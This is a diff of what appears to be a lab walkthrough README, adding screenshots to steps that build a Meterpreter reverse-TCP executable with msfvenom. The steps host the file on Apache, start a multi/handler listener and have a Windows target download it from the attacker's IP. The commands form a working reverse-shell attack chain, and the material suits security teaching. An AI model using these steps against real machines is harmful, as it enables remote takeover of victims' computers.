@@ -62,24 +62,28 @@ msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
 Find the attackers ip address using ifconfig
 
 ### Output:
-
-
+<img width="752" height="419" alt="image" src="https://github.com/user-attachments/assets/b7dfd157-45f2-45df-8c66-baf5e06a73b6" />
 
 Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
 
 ### Output:
 
+<img width="899" height="252" alt="image" src="https://github.com/user-attachments/assets/00765a84-d756-41fa-9c7f-ef956262cff8" />
 
 
 copy the fun.exe into the apache ```/var/www/html ```folder
 
+<img width="494" height="93" alt="image" src="https://github.com/user-attachments/assets/30abfaca-ceb1-4e46-a00c-447103ca6a60" />
 
 
 Start apache server ```sudo systemctl apache2 start``` 
 
+<img width="449" height="65" alt="image" src="https://github.com/user-attachments/assets/7cc8db89-db91-45f0-bebd-2b1789254c9f" />
 
 
 Check the status of apache2 ```sudo apache2 status```
+
+<img width="970" height="533" alt="image" src="https://github.com/user-attachments/assets/53221e51-3db3-4a7e-b69e-ce0fd7adf66c" />
 
 
 Invoke msfconsole:
@@ -90,6 +94,7 @@ Starting a command and control Server ```use multi/handler``` ```set PAYLOAD win
 
 ### Output 
 
+<img width="1193" height="874" alt="image" src="https://github.com/user-attachments/assets/8d048f7c-9db5-4a01-bfd2-ed6237a7e142" />
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
 
